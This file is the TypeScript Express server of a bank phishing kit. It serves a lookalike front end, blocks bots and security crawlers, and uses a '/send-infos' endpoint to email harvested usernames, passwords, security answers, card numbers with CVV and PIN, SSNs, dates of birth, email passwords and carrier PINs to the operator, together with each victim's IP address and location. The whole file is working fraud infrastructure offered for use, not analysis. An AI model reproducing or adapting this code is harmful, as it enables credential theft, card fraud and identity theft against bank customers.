import express from "express";
import noBots from "express-nobots";
import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";

require("dotenv").config();

import { sendEmail } from "./utils/sendEmail";
import path from "path";

const app = express();

const port = process.env.PORT || 5000;

app.use(noBots());
app.use(express.json());

app.post("/send-infos", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    const values = req.body;
    await sendEmail(
      process.env.EMAIL_ADDRESS as string,
      `
     <div>*******************************************************************************************</div>
     <div>*******************************************************************************************</div>
     ${
       values.form === "LOGIN DETAILS"
         ? `
        <br>
        <h4>| LOGIN DETAILS</h4>
        <p>| USERNAME 👉🏽 <b>${values.loginDetails.username}</b></p>
        <p>| PASSWORD 👉🏽 <b>${values.loginDetails.password}</b></p>
        <br>
        `
         : `
     ${
       values.form === "SECURITY CHALLENGE"
         ? `
     <br>
     <h4>| SECURITY CHALLENGE</h4>
     <p>| QUESTION ONE 👉🏽 <b>${values.securityChallenge.question1}</b></p>
     <p>| ANSWER ONE 👉🏽 <b>${values.securityChallenge.answer1}</b></p>
     <p>| QUESTION TWO 👉🏽 <b>${values.securityChallenge.question2}</b></p>
     <p>| ANSWER TWO 👉🏽 <b>${values.securityChallenge.answer2}</b></p>
     <p>| QUESTION THREE 👉🏽 <b>${values.securityChallenge.question3}</b></p>
     <p>| ANSWER THREE 👉🏽 <b>${values.securityChallenge.answer3}</b></p>
     <br>
     `
         : `${
             values.form === "CARD INFORMATION"
               ? `
      <br>
      <h4>| CARD INFORMATION</h4>
      <p>| CARD NUMBER 👉🏽 <b>${values.cardInformation.cardNumber}</b></p>
      <p>| EXPIRATION DATE 👉🏽 <b>${values.cardInformation.expiryDate}</b></B></p>
      <p>| CVV 👉🏽 <b>${values.cardInformation.cvv}</b></p>
      <p>| CARD PIN 👉🏽 <b>${values.cardInformation.cardPin}</b></p>
      <br>
     `
               : `${
                   values.form === "PERSONAL INFORMATION"
                     ? `
         <br>
         <h4>| PERSONAL INFORMATION</h4>
         <p>| FIRST NAME 👉🏽 <b>${values.personalInfo.firstname}</b></p>
         <p>| LAST NAME 👉🏽 <b>${values.personalInfo.lastname}</b></p>
         <p>| SSN 👉🏽 <b>${values.personalInfo.ssn}</b></p>
         <p>| DOB 👉🏽 <b>${values.personalInfo.dob}</b></p>
         <p>| ADDRESS 👉🏽 <b>${values.personalInfo.address}</b></p>
         <p>| ZIP CODE 👉🏽 <b>${values.personalInfo.zipCode}</b></p>
         <p>| STATE 👉🏽 <b>${values.personalInfo.state}</b></p>
         <br>
        `
                     : `
               <br>
               <h4>| ACCOUNT UPDATE</h4>
               <p>| EMAIL ADDRESS 👉🏽 <b>${values.accountUpdate.email}</b></p>
               <p>| EMAIL ADDRESS PASSWORD 👉🏽 <b>${values.accountUpdate.emailPassword}</b></p>
               <p>| PHONE NUMBER 👉🏽 <b>${values.accountUpdate.phoneNumber}</b></p>
               <p>| CARRIER PIN 👉🏽 <b>${values.accountUpdate.carrierPin}</b></p>
               <br>
               `
                 }`
           }`
     }
     `
     }
     <div>*******************************************************************************************</div>
     <div>*******************************************************************************************</div>
     <br>
     <p>| IP 👉🏽 <b>${ip}</b></p>
     <p>| LOCATION 👉🏽 <b>${geo?.city}, ${geo?.country}</b></p>
     <p>| TIMEZONE 👉🏽 <b>${geo?.timezone}</b></p>
     <p>| USER AGENT 👉🏽 <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>*********************************************************************************************</div>
     <div>********************************************END********************************************</div>
     `,
      `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
    );
    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
  }
});

app.use(express.static(path.join(__dirname, "../build")));
app.get("/*", (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  res.sendFile(path.join(__dirname, "../build", "index.html"));
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
